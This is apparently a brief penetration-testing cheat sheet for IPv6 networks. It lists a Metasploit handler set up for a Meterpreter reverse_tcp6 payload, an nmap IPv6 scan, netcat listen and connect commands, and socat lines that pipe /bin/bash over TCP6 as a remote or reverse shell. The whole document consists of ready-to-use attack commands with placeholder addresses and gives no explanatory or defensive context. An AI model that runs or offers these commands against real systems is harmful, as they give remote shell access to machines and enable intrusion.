# Metasploit:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp6
set LHOST <Your IPv6 Address>
set LPORT <Port>
exploit

# NMAP:
nmap -6 -sC -sV <IPv6 Address>

# Netcat:
nc -6 -lvp <port> # listener
nc -6 <IPv6 Address> <port> # connect

# Socat:
socat TCP6-LISTEN:<port> EXEC:/bin/bash # reverse shell
socat TCP6:<IPv6 Address>:<port> EXEC:/bin/bash # connect back

